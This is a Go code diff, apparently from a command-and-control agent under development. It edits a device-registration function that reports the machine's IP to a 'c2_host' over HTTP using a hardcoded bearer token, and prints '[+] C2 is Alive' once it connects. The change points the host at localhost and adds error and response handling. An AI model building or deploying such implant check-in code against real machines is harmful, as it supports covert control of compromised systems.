@@ -65,15 +65,16 @@ func handler(w http.ResponseWriter, r *http.Request) {
 func api_call_addDevice() {
 
 	ipAddr := get_ip().String()
-	c2_host := "192.168.206.210"
+	c2_host := "127.0.0.1"
 	url := "http://" + c2_host + ":8000/api/devices/addDevice"
 
 	timeout := 1 * time.Second
-	conn, err := net.DialTimeout("tcp", c2_host+":myport", timeout)
+	conn, err := net.DialTimeout("tcp", c2_host+":8000", timeout)
 	if err != nil {
 		log.Println("Site unreachable, error: ", err)
+		log.Fatal(1)
 	}
-	fmt.Printf("\n CONN -> %s", conn)
+	fmt.Printf("\n [+] C2 is Alive -> %s", conn.LocalAddr().String())
 	// Create a Bearer string by appending string access token
 	var bearer = "Bearer " + "XxPFUhQ8R7kKhpgubt7v"
 
@@ -86,7 +87,10 @@ func api_call_addDevice() {
 
 	// Create a new request using http
 	req, err := http.NewRequest("POST", url, responseBody)
+	if err != nil {
+		log.Println("Error on response.\n[ERROR] -", err)
 
+	}
 	// add authorization header to the req
 	req.Header.Add("Authorization", bearer)
 
@@ -95,7 +99,20 @@ func api_call_addDevice() {
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Println("Error on response.\n[ERROR] -", err)
+
 	}
+	type responseStruct struct {
+		DeviceID uint32 `json:"device_id"`
+	}
+	var respStruct responseStruct
+
+	decoder := json.NewDecoder(resp.Body)
+	// decoder := json.NewDecoder(resp.Body)
+	if err := decoder.Decode(&respStruct); err != nil {
+		log.Println("Error in decode")
+	}
+	fmt.Printf("\n\n Respons -> %d", respStruct.DeviceID)
+	fmt.Printf("\n\n NEW Respons -> %s", decoder)
 	defer resp.Body.Close()
 
 	// resp, err := http.Post(url,"application/json", responseBody)
